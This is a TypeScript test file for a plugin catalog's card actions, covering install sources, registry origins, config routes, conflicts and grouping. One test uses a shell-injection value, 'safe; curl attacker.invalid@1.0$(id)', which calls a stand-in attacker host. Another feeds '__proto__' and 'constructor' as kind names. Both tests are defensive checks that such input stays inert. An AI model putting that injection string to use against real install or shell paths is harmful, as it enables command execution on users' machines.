import assert from 'node:assert/strict';
import test from 'node:test';

import {
  catalogKindLabelKey,
  groupCatalogEntries,
  isConfiguredProviderUnavailable,
  pluginCardActions,
  pluginCardStatus,
} from './pluginCardActions.ts';

type Entry = Parameters<typeof pluginCardActions>[0];

function entry(overrides: Partial<Entry>): Entry {
  return {
    available: false,
    compiled_in: false,
    configured: false,
    conflicted: false,
    description: null,
    display_name: null,
    id: 'example',
    installed: false,
    kind: 'channel',
    mirrors_builtin: false,
    origin: 'registry',
    permissions: [],
    plugin_name: null,
    install_source: null,
    registry_origin: null,
    toggleable: false,
    version: null,
    ...overrides,
  };
}

test('registry mirror keeps install primary while exposing typed config', () => {
  const actions = pluginCardActions(entry({
    available: true,
    configured: true,
    id: 'git',
    install_source: 'gitea@0.2.0',
    plugin_name: 'gitea',
    registry_origin: 'default',
    toggleable: true,
  }));

  assert.equal(actions.primary, 'install');
  assert.equal(actions.installSource, 'gitea@0.2.0');
  assert.equal(actions.registryOrigin, 'default');
  assert.equal(actions.configHref, '/config/channels/git');
});

test('custom-registry channel exposes exact display source but no registry URL', () => {
  const actions = pluginCardActions(entry({
    available: true,
    id: 'plugin.notion',
    install_source: 'notion@1.4.0',
    plugin_name: 'notion',
    registry_origin: 'custom',
  }));

  assert.equal(actions.primary, 'install');
  assert.equal(actions.installSource, 'notion@1.4.0');
  assert.equal(actions.registryOrigin, 'custom');
  assert.equal(actions.configHref, null);
  assert.equal('installCommand' in actions, false);
});

test('provider conflicts expose neither ambiguous install nor config actions', () => {
  const actions = pluginCardActions(entry({
    available: true,
    conflicted: true,
    id: 'git',
    toggleable: false,
  }));

  assert.equal(actions.primary, 'none');
  assert.equal(actions.installSource, null);
  assert.equal(actions.registryOrigin, null);
  assert.equal(actions.configHref, null);
});

test('toggleable remains the sole authority for a typed config route', () => {
  const actions = pluginCardActions(entry({
    conflicted: true,
    id: 'git',
    toggleable: true,
  }));

  assert.equal(actions.installSource, null);
  assert.equal(actions.configHref, '/config/channels/git');
  assert.equal(actions.primary, 'configure');
});

test('untrusted registry metacharacters remain an inert display token', () => {
  const source = 'safe; curl attacker.invalid@1.0$(id)';
  const actions = pluginCardActions(entry({
    available: true,
    install_source: source,
    registry_origin: 'custom',
  }));

  assert.equal(actions.installSource, source);
  assert.equal('installCommand' in actions, false);
});

test('configured uncompiled channel with no provider is unavailable', () => {
  assert.equal(isConfiguredProviderUnavailable(entry({
    configured: true,
    origin: 'built_in',
    toggleable: true,
  })), true);
  assert.equal(isConfiguredProviderUnavailable(entry({
    available: true,
    configured: true,
    install_source: 'example@1.0.0',
    origin: 'registry',
  })), false);
});

test('configured installed novel capability reports intent after subsystem status', () => {
  const novel = entry({
    configured: true,
    id: 'plugin.novel',
    installed: true,
    origin: 'plugin',
  });

  assert.equal(pluginCardStatus(novel, true), 'configured');
  assert.equal(pluginCardStatus(novel, false), 'installed_off');
});

test('unknown kind names cannot access prototype properties or corrupt grouping', () => {
  assert.equal(catalogKindLabelKey('__proto__'), null);
  assert.equal(catalogKindLabelKey('constructor'), null);

  const prototype = entry({ id: 'prototype', kind: '__proto__' });
  const constructor = entry({ id: 'constructor', kind: 'constructor' });
  const groups = groupCatalogEntries([prototype, constructor]);

  assert.equal(groups.size, 2);
  assert.deepEqual(groups.get('__proto__'), [prototype]);
  assert.deepEqual(groups.get('constructor'), [constructor]);
});
